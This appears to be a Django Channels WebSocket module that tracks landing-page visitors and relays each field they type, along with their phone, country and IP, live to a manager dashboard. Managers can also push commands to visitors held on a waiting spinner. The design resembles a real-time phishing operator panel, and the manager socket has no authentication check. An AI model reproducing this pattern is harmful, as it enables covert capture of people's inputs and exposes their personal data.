import asyncio
import json

from asgiref.sync import async_to_sync, sync_to_async
from channels.db import database_sync_to_async
from channels.generic.websocket import AsyncWebsocketConsumer
from channels.layers import get_channel_layer

from apps.core.models import Visitor, VisitorLogEntry
from apps.core.presence import (
    HEARTBEAT_INTERVAL,
    get_presence,
    heartbeat,
    mark_offline,
    mark_online,
    online_visitor_ids,
)
from apps.core.utils import get_client_ip

MANAGER_GROUP = 'online_managers'


def visitor_group_name(visitor_id):
    """Per-visitor group: lets a manager reach this visitor's WS connection
    regardless of which worker process it's actually attached to."""
    return f'visitor_{visitor_id}'


def visitor_needs_action(step):
    # Parked on the spinner, waiting for the manager to send them onward.
    return step == 'waiting'


def get_or_create_visitor(visitor_id):
    visitor, _ = Visitor.objects.get_or_create(visitor_id=visitor_id)
    return visitor


def update_visitor(visitor_id, **fields):
    visitor = get_or_create_visitor(visitor_id)
    for key, value in fields.items():
        setattr(visitor, key, value)
    if 'step' in fields:
        visitor.needs_action = visitor_needs_action(visitor.step)
    visitor.save()
    return visitor


def visitor_dict(visitor, live=None):
    return {
        'id': visitor.visitor_id,
        'phone': visitor.phone,
        'country': visitor.country,
        'step': visitor.step,
        'ip': visitor.ip or '',
        # An offline visitor can't be acted on (no channel to send a command to),
        # so don't flag them as needing action even if that was their last state.
        'needs_action': visitor.needs_action if live else False,
        'last_seen_at': visitor.last_seen_at.isoformat(),
        'connected_at': live['connected_at'] if live else None,
    }


def public_visitor(visitor_id):
    """Manager-facing dict for one online visitor: live presence + DB state."""
    live = get_presence(visitor_id)
    if not live:
        return None
    visitor = get_or_create_visitor(visitor_id)
    return visitor_dict(visitor, live)


def offline_visitors_snapshot():
    """Manager-facing list of persisted visitors that aren't currently connected."""
    visitors = Visitor.objects.exclude(visitor_id__in=online_visitor_ids()).order_by('-last_seen_at')
    return [visitor_dict(v) for v in visitors]


def write_log_entry(visitor_id, field, value):
    visitor = get_or_create_visitor(visitor_id)
    entry = VisitorLogEntry.objects.create(visitor=visitor, field=field, value=value)
    return {
        'field': entry.field,
        'value': entry.value,
        'at': entry.created_at.isoformat(),
    }


def get_log_entries(visitor_id):
    entries = VisitorLogEntry.objects.filter(visitor__visitor_id=visitor_id).order_by('created_at')
    return [{'field': e.field, 'value': e.value, 'at': e.created_at.isoformat()} for e in entries]


def log_visitor_input(visitor_id, field, value):
    """Record one log entry and push it to managers, from sync code (e.g. a Django view)."""
    if not visitor_id:
        return
    entry = write_log_entry(visitor_id, field, value)
    async_to_sync(get_channel_layer().group_send)(MANAGER_GROUP, {
        'type': 'visitor.log',
        'visitor_id': visitor_id,
        'entry': entry,
    })


def update_visitor_and_notify(visitor_id, **fields):
    """Update persisted visitor fields and push the change to managers, from sync code."""
    if not visitor_id:
        return
    update_visitor(visitor_id, **fields)
    visitor = public_visitor(visitor_id)
    if not visitor:
        return
    async_to_sync(get_channel_layer().group_send)(MANAGER_GROUP, {
        'type': 'visitor.update',
        'visitor': visitor,
    })


class VisitorTrackerConsumer(AsyncWebsocketConsumer):
    """Tracks a landing-page visitor and reports them to the manager group."""

    async def connect(self):
        visitor_id = self.scope['session'].get('visitor_id')
        if not visitor_id:
            await self.close()
            return

        self.visitor_id = visitor_id
        self.group_name = visitor_group_name(visitor_id)
        self._heartbeat_task = None

        await self.channel_layer.group_add(self.group_name, self.channel_name)
        await sync_to_async(mark_online, thread_sensitive=False)(visitor_id)

        await database_sync_to_async(update_visitor)(
            visitor_id,
            phone=self.scope['session'].get('visitor_phone', ''),
            country=self.scope['session'].get('visitor_country', ''),
            step='connecting',
            ip=get_client_ip(self.scope) or None,
        )

        await self.accept()
        self._heartbeat_task = asyncio.ensure_future(self._heartbeat_loop())

        visitor = await database_sync_to_async(public_visitor)(visitor_id)
        await self.channel_layer.group_send(MANAGER_GROUP, {
            'type': 'visitor.update',
            'visitor': visitor,
        })

    async def _heartbeat_loop(self):
        # Keeps the Redis presence entry from expiring while the socket is
        # genuinely still open; if this task stops (crash/disconnect), the
        # entry ages out on its own instead of staying "online" forever.
        try:
            while True:
                await asyncio.sleep(HEARTBEAT_INTERVAL)
                await sync_to_async(heartbeat, thread_sensitive=False)(self.visitor_id)
        except asyncio.CancelledError:
            pass

    async def visitor_command(self, event):
        await self.send(text_data=json.dumps({
            'type': 'command',
            'command': event['command'],
        }))

    async def receive(self, text_data=None, bytes_data=None):
        if not text_data:
            return

        try:
            data = json.loads(text_data)
        except ValueError:
            return

        if 'field' in data:
            entry = await database_sync_to_async(write_log_entry)(
                self.visitor_id, str(data.get('field', '')), str(data.get('value', ''))
            )
            await self.channel_layer.group_send(MANAGER_GROUP, {
                'type': 'visitor.log',
                'visitor_id': self.visitor_id,
                'entry': entry,
            })
            return

        step = data.get('step')
        if step:
            await database_sync_to_async(update_visitor)(self.visitor_id, step=step)

        visitor = await database_sync_to_async(public_visitor)(self.visitor_id)
        await self.channel_layer.group_send(MANAGER_GROUP, {
            'type': 'visitor.update',
            'visitor': visitor,
        })

    async def disconnect(self, close_code):
        visitor_id = getattr(self, 'visitor_id', None)
        if not visitor_id:
            return

        if self._heartbeat_task:
            self._heartbeat_task.cancel()

        await self.channel_layer.group_discard(self.group_name, self.channel_name)
        await sync_to_async(mark_offline, thread_sensitive=False)(visitor_id)
        await self.channel_layer.group_send(MANAGER_GROUP, {
            'type': 'visitor.leave',
            'visitor_id': visitor_id,
        })


class ManagerConsumer(AsyncWebsocketConsumer):
    """Feeds the manager dashboard a live list of online visitors."""

    async def connect(self):
        await self.channel_layer.group_add(MANAGER_GROUP, self.channel_name)
        await self.accept()

        def snapshot():
            online = [v for v in (public_visitor(vid) for vid in online_visitor_ids()) if v]
            offline = offline_visitors_snapshot()
            return online, offline

        online, offline = await database_sync_to_async(snapshot)()
        await self.send(text_data=json.dumps({
            'type': 'snapshot',
            'online': online,
            'offline': offline,
        }))

    async def disconnect(self, close_code):
        await self.channel_layer.group_discard(MANAGER_GROUP, self.channel_name)

    async def receive(self, text_data=None, bytes_data=None):
        if not text_data:
            return

        try:
            data = json.loads(text_data)
        except ValueError:
            return

        message_type = data.get('type')

        if message_type == 'get_log':
            visitor_id = data.get('visitor_id')
            entries = await database_sync_to_async(get_log_entries)(visitor_id)
            await self.send(text_data=json.dumps({
                'type': 'log_snapshot',
                'visitor_id': visitor_id,
                'entries': entries,
            }))
            return

        if message_type == 'command':
            visitor_id = data.get('visitor_id')
            live = await sync_to_async(get_presence, thread_sensitive=False)(visitor_id)
            if not live:
                return

            await self.channel_layer.group_send(visitor_group_name(visitor_id), {
                'type': 'visitor.command',
                'command': data.get('command'),
            })

    async def visitor_update(self, event):
        await self.send(text_data=json.dumps({
            'type': 'update',
            'visitor': event['visitor'],
        }))

    async def visitor_leave(self, event):
        await self.send(text_data=json.dumps({
            'type': 'leave',
            'visitor_id': event['visitor_id'],
        }))

    async def visitor_log(self, event):
        await self.send(text_data=json.dumps({
            'type': 'log',
            'visitor_id': event['visitor_id'],
            'entry': event['entry'],
        }))
